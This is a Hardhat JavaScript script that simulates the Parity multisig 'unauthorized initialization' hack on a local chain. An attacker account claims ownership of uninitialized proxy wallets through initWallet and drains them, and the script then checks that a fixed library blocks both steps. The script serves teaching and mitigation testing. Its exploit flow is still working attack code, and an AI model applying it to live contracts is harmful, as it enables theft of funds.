import hre from "hardhat";
import { parseEther, formatEther } from "ethers";

async function main() {
    console.log("=== Parity Hack #1 Simulation (Unauthorized Initialization) ===");
    const [deployer, owner1, attacker] = await hre.ethers.getSigners();

    // 1. Deploy Vulnerable Library
    const LibraryVulnerable = await hre.ethers.getContractFactory("WalletLibraryVulnerable");
    const lib = await LibraryVulnerable.deploy();
    await lib.waitForDeployment();
    const libAddr = await lib.getAddress();
    console.log(`Vulnerable Library deployed at: ${libAddr}`);

    // 2. Deploy Proxies
    const Proxy = await hre.ethers.getContractFactory("WalletVulnerable");
    const wallet1 = await Proxy.deploy(libAddr);
    await wallet1.waitForDeployment();
    const wallet1Addr = await wallet1.getAddress();
    
    const wallet2 = await Proxy.deploy(libAddr);
    await wallet2.waitForDeployment();
    const wallet2Addr = await wallet2.getAddress();
    
    const wallet3 = await Proxy.deploy(libAddr);
    await wallet3.waitForDeployment();
    const wallet3Addr = await wallet3.getAddress();

    // Fund wallets with 5 ETH
    await deployer.sendTransaction({ to: wallet1Addr, value: parseEther("5.0") });
    await deployer.sendTransaction({ to: wallet2Addr, value: parseEther("5.0") });
    await deployer.sendTransaction({ to: wallet3Addr, value: parseEther("5.0") });

    // 3. Legitimate Flow (Wallet 1)
    const wallet1Lib = LibraryVulnerable.attach(wallet1Addr);
    await wallet1Lib.connect(owner1).initWallet(owner1.address);
    console.log("Wallet 1 initialized legitimately by Owner 1.");
    
    await wallet1Lib.connect(owner1).execute(owner1.address, parseEther("1.0"), "0x");
    console.log(`Wallet 1: Owner successfully withdrew 1 ETH. Balance: ${formatEther(await hre.ethers.provider.getBalance(wallet1Addr))} ETH`);

    // 4. Exploit Flow (Wallet 2 & 3)
    console.log("\nAttacker hijacking Wallet 2 and 3 via delegatecall to initWallet...");
    const wallet2Lib = LibraryVulnerable.attach(wallet2Addr);
    const wallet3Lib = LibraryVulnerable.attach(wallet3Addr);

    await wallet2Lib.connect(attacker).initWallet(attacker.address);
    await wallet3Lib.connect(attacker).initWallet(attacker.address);

    await wallet2Lib.connect(attacker).execute(attacker.address, await hre.ethers.provider.getBalance(wallet2Addr), "0x");
    await wallet3Lib.connect(attacker).execute(attacker.address, await hre.ethers.provider.getBalance(wallet3Addr), "0x");

    console.log(`Wallet 2 Balance: ${formatEther(await hre.ethers.provider.getBalance(wallet2Addr))} ETH`);
    console.log(`Wallet 3 Balance: ${formatEther(await hre.ethers.provider.getBalance(wallet3Addr))} ETH`);
    console.log("SUCCESS: Attacker drained uninitialized wallets 2 and 3.");

    // 5. Test Mitigation
    console.log("\n--- Testing Fixed Wallet (WalletFixed) ---");
    
    // Deploy the Fixed Library first
    const LibraryFixed = await hre.ethers.getContractFactory("WalletLibraryFixed");
    const fixedLib = await LibraryFixed.deploy();
    await fixedLib.waitForDeployment();
    const fixedLibAddr = await fixedLib.getAddress();

    // Deploy the Fixed Wallet pointing to the Fixed Library
    const WalletFixed = await hre.ethers.getContractFactory("WalletFixed");
    const fixedWallet = await WalletFixed.deploy(fixedLibAddr);
    await fixedWallet.waitForDeployment();
    const fixedAddr = await fixedWallet.getAddress();
    
    // Fund the fixed wallet
    await deployer.sendTransaction({ to: fixedAddr, value: parseEther("5.0") });
    
    const fixedProxyLib = await hre.ethers.getContractAt("WalletLibraryFixed", fixedAddr);
    await fixedProxyLib.connect(owner1).initWallet(owner1.address);
    console.log("Fixed Wallet initialized.");

    try {
        // Test re-initialization block
        await fixedProxyLib.connect(attacker).initWallet(attacker.address);
        console.log("FAILED: Attacker re-initialized fixed wallet.");
    } catch (e) {
        console.log("SUCCESS: Attacker prevented from re-initializing fixed wallet.");
    }

    try {
        // Test unauthorized non-owner execution block
        await fixedProxyLib.connect(attacker).execute(attacker.address, parseEther("1.0"), "0x");
        console.log("FAILED: Attacker executed unauthorized transaction on fixed wallet.");
    } catch (e) {
        console.log("SUCCESS: Attacker prevented from executing non-owner transaction.");
    }
}

main().catch(console.error);
